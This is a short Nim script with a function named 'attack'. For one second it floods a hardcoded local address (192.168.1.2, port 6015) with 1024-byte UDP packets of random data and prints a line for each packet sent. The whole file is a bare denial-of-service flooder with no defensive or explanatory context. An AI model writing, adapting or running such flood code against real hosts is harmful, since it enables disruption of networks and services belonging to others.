import net, strformat, times

const
   address = "192.168.1.2"
   port = Port(6015)
   duration = 1.0 # 1s

proc randStr(length: Natural): string =
   result = newString(length)
   var f: File
   try:
      f = open("/dev/urandom")
      discard f.readBuffer(cstring(result), length)
   finally:
      close(f)

proc attack() =
   let s = newSocket(Domain.AF_INET, SockType.SOCK_DGRAM, Protocol.IPPROTO_UDP)
   let bytes = randStr(1024)
   let start = epochTime()
   var now = epochTime()
   var i = 0
   # Run for duration
   while now - start < duration:
      s.sendTo(address, port, bytes)
      echo &"Sent {i}'th packet to {address} throught port {port}"
      i.inc
      # Update timer
      now = epochTime()

attack()
